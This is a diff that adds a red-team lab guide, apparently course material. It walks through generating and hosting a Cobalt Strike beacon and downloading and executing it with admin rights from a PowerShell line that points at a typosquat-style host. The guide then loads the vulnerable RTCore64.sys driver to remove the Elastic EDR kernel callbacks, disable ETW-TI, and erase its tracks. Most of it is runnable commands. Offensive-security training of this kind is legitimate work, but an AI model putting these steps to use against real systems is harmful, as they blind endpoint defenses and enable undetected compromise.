@@ -1,0 +1,79 @@
+# Generate and host payload
+
+1. [ ] Launch Cobalt Strike and connect to the Team Server.
+2. [ ] Generate a payload.
+    1. **Payloads > Windows Stageless Payload**
+    2. Listener: http
+    3. Click **Generate**
+    4. Save to *C:\Payloads\beacon_x64.exe*
+3. [ ] Host the payload.
+    1. **Site Management > Host File**
+    2. File: +++C:\Payloads\beacon_x64.exe+++
+    3. Local URI: +++/beacon_x64.exe+++
+    4. Click **Launch**
+4. [ ] Switch to @lab.VirtualMachine(lon-wkstn-1).SelectLink and login with +++@lab.VirtualMachine(lon-wkstn-1).Password+++.
+5. [ ] Download and execute the payload (as a local admin).
+ 
+	```powershell
+    iwr -Uri "http://www.bleepincomputer.com/beacon_x64.exe" -OutFile "C:\Users\pchilds\Downloads\beacon_x64.exe"
+    Start-Process -FilePath "C:\Users\pchilds\Downloads\beacon_x64.exe" -Verb RunAs
+    ```
+
+6. [ ] Switch back to the @lab.VirtualMachine(attacker-desktop).SelectLink.
+7. [ ] Unload *crystalkit.cna* so we lose all of our postex evasion.
+8. [ ] Interact with Beacon and run a noisy postex command:
+
+	```beacon-nocolor
+	execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
+	```
+
+9. [ ] Switch to @lab.VirtualMachine(lon-wkstn-1).SelectLink.
+10. [ ] Go to +++https://10.10.120.200:5601+++ and login with +++elastic+++.
+11. [ ] Select the alerts and mark them as closed.
+12. [ ] Switch back to the @lab.VirtualMachine(attacker-desktop).SelectLink again.
+
+---
+# Vulnerable driver
+
+1. [ ] Spawn another Beacon in a Microsoft signed executable.
+    1. +++spawnto x64 %windir%\sysnative\Defrag.exe+++
+    2. +++spawn tcp-local+++
+
+2. [ ] Interact with this new Beacon.
+3. [ ] Upload the driver.
+    1. +++cd C:\Windows\System32\drivers+++
+    2. +++upload C:\Tools\driver-bofs\RTCore64.sys+++
+
+4. [ ] Run the driver.
+    1. +++run sc create RTCore type= kernel binPath= C:\Windows\System32\drivers\RTCore64.sys+++
+    2. +++run sc start RTCore+++
+
+5. [ ] Load the *kernel.cna* Aggressor Script located in *C:\Tools\driver-bofs*.
+
+6. [ ] List current kernel callbacks:
+    1. +++callback_list+++
+
+7. [ ] Disable all callbacks for *elastic-endpoint-driver.sys*.
+    1. +++callback_remove 0 elastic-endpoint-driver.sys+++
+    2. +++callback_remove 1 elastic-endpoint-driver.sys+++
+    3. +++callback_remove 2 elastic-endpoint-driver.sys+++
+    4. +++callback_remove 3 elastic-endpoint-driver.sys+++
+    5. +++callback_remove 5 elastic-endpoint-driver.sys+++
+
+8. [ ] Disable ETW-TI.
+    1. +++etw_disable {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}+++
+
+9. [ ] Unload and delete the driver.
+    1. +++run sc stop RTCore+++
+    2. +++run sc delete RTCore+++
+    3. +++rm RTCore64.sys+++
+
+10. [ ] Run the same postex command again:
+    1. +++execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist+++
+
+11. [ ] Switch to @lab.VirtualMachine(lon-wkstn-1).SelectLink and see if any alerts were generated.
+
+> [!hint] Hopefully not 🤞🏻
+
+
+> [!knowledge] In this lab, you have used a vulnerable driver to disable EDR telemetry in the kernel.
